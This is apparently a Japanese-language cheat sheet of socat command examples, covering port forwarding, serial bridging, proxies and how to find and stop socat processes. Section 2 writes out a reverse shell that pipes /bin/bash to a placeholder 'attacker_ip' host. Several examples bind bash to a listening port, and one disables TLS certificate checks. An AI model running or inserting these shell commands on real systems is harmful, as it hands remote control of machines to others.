```toc
```
# 概要
socat は「Socket CAT」の略で、汎用ネットワークツールです。ポートフォワーディング、プロキシ、トンネリング、リダイレクトなど、様々な用途に使えます。

# ✅ よく使う socat コマンド例一覧
## 🔁 1. ポートフォワーディング（ローカルポート → リモート）
```bash
socat TCP-LISTEN:1234,fork TCP:192.168.1.10:80
```
localhost:1234 にアクセスすると 192.168.1.10:80 に転送

## ⬅️ 2. リバースシェル（サーバー側で待ち受け）
```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash
```
ターゲット側（クライアント）で：

bash


socat TCP:attacker_ip:4444 EXEC:/bin/bash
## 🔄 3. シリアルポート ↔ TCP 接続
bash


socat /dev/ttyUSB0,raw,echo=0 TCP:192.168.1.5:23
## 🔧 4. ローカル UNIX ドメインソケット作成
bash


socat UNIX-LISTEN:/tmp/mysocket,fork EXEC:/usr/bin/myapp
## 🔁 5. 任意の TCP <-> TCP ブリッジ
bash


socat TCP-LISTEN:9000,fork TCP:example.com:443
## 🧪 6. HTTPS 通信のトンネル（証明書無視）
bash


socat - OPENSSL:example.com:443,verify=0
## 🔥 7. socat で SOCKS プロキシ経由通信
bash


socat TCP-LISTEN:8080,fork SOCKS4A:127.0.0.1:target.com:80,socksport=9050
※ Tor 通信などに使える

## 📚 socat オプション解説
オプション	説明
fork	クライアントごとに新しいプロセス
reuseaddr	ソケット再利用を許可
TCP-LISTEN	待ち受けソケットを作る
EXEC:	コマンドを実行して stdin/stdout に接続
OPENSSL:	SSL/TLS 経由で接続する

## 🔍 補足
socat はデバッグ用に -d -d オプションで詳細ログが出せます。

man socat で詳細マニュアルが見られますが、非常に長いので用途別に調べるのが効率的です。

---
# 現在起動中のsocat

現在起動中の socat プロセスを確認するには、以下のコマンドを使います：
```bash
ps aux | grep '[s]ocat'
```

またはより詳しい情報を得たい場合：
```bash
pgrep -a socat
```

それぞれの意味：
ps aux | grep '[s]ocat'：socat を含むプロセス一覧を表示します（grep socat だとそのコマンド自身も引っかかるが、[s]ocat にすることで回避）。

pgrep -a socat：実行中の socat プロセスのPIDとコマンドラインを表示します。

例：
```bash
$ ps aux | grep '[s]ocat'
root      12345  0.0  0.1   9100   500 pts/0    S+   21:01   0:00 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```
もし何も表示されない場合は、現在 socat は起動していません。

---
# 停止
socat を停止するには、プロセスID（PID）を特定して kill します。

起動中の socat プロセスを確認
```bash
pgrep -a socat
```

```bash
12345 socat TCP-LISTEN:8080,fork EXEC:/bin/bash
```

プロセスを停止
```bash
kill 12345
```

強制終了したい場合：
```bash
kill -9 12345
```

複数の socat が起動している場合は、すべてのPIDを kill してください。
```bash
pkill socat
```
で一括停止も可能です（注意して使用してください）。